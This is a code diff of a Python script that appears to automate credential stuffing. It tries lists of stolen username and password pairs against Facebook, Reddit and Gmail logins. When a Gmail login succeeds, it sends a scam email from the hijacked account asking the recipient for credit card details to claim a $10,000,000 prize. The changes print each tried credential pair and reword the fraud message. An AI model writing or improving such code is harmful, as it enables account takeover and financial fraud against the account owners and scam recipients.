@@ -112,6 +112,9 @@ def sendMail(user, password, toaddr, subject, body):
 	server.sendmail(user, toaddr, msg)
 	server.quit()
 
+def printCreds(u, p, w):
+	msg = "{} {} : {}".format(u, p, w)
+	print(msg)
 
 
 def main():
@@ -139,19 +142,22 @@ def main():
 			line = f.readline()
 
 		for u, p in creds:
+			printCreds(u, p, 'facebook')
 			if facebook(driver, u, p):
 				break
 
 		for u, p in creds:
+			printCreds(u, p, 'reddit')
 			if reddit(driver, u, p):
 				break
 
 		for u, p in creds:
+			printCreds(u, p, 'gmail')
 			if gmail(driver, u, p):
 				sendMail(u, p,
 					"chlsgong@utexas.edu",
-					"You received $10,000,000!",
-					"Send credit card info."
+					"You won $10,000,000!",
+					"Send credit card info to receive payment."
 				)
 				break
 
